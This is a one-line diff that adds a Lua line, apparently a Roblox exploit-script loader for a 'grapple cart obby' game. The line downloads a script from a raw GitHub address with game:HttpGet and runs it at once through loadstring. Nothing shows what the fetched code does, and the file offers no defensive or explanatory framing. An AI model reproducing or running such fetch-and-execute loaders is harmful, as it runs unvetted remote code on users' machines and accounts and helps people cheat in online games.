@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/1-2-player-grapple-cart-obby-spam0-9xnmgz8whh7s16.lua"))()
